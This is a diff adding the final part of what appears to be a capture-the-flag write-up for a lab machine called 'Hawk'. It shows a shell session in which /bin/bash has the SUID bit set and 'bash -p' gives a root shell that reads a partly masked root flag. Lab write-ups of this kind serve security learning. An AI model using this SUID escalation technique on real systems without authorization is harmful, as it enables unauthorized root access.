@@ -584,6 +584,25 @@ Now that we can run commands, we assign SUID permission to bash:
 
 <br />
 
+![11](../../../assets/images/Hawk/12.png)
 
+<br />
+
+We check that the command has been executed successfully and yes!! So we execute the bash with the -p parameter so that it takes into account the SUID permission and we become root!!
+
+<br />
+
+```bash
+daniel@hawk:~$ ls -l /bin/bash
+-rwsr-xr-x 1 root root 1113504 Apr  4  2018 /bin/bash
+daniel@hawk:~$ bash -p
+bash-4.4# whoami
+root
+bash-4.4# cd /root
+bash-4.4# cat root.txt
+7322df6dda73c371c1eaebc9c0xxxxxx
+```
+
+<br />
 
 
